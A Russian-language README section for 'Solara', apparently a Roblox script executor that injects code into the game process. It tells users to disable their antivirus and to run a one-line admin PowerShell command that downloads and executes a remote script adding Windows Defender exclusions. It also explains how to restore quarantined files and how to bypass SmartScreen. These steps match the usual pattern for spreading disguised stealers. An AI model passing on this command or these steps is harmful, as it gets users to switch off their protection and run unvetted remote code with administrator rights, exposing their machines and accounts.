# ANTIVIRUS — почему детектит и что делать

> ⚠️ **Отключи антивирус перед установкой и первым запуском. После — добавь Solara в исключения.**

## Почему так
Solara делает `OpenProcess / WriteProcessMemory / CreateRemoteThread` в живой `RobloxPlayerBeta.exe`. Для эвристики это `HackTool:Win32 / Trojan:Win32.Agent`. Так помечаются все executors: Solara, Xeno, Wave, Potasium, Wave. Это ожидаемо, а не признак зараженной сборки — при условии что качаешь из этого репозитория / официальных зеркал.

## Windows Defender — исключения
```powershell
# от администратора, одна команда:
irm https://raw.githubusercontent.com/ChampionWand/SolaraV3/main/scripts/add-exclusion.ps1 | iex
```
Вручную: `Безопасность Windows → Защита от вирусов → Управление настройками → Исключения → + Добавить папку C:\SolaraV3 + процессы SolaraV3.exe, Bootstrapper.exe`

## Если exe уже удален
1. `Безопасность → Журнал защиты → Карантин → Восстановить SolaraV3.exe`
2. Сразу добавь исключение, иначе удалит снова
3. Перекачай через `install.ps1` если файла уже нет

## SmartScreen vs реальный детект
- `Reputation warning (нераспознанное приложение)` — просто нет подписи, жми Подробнее → Выполнить
- `Trojan / HackTool quarantined` — это и есть детект инжекта, лечится исключением выше

Качай только отсюда. Реаплоады на рандомных сайтах / в описаниях YouTube — главный путь поймать реальный стилер под видом Solara.
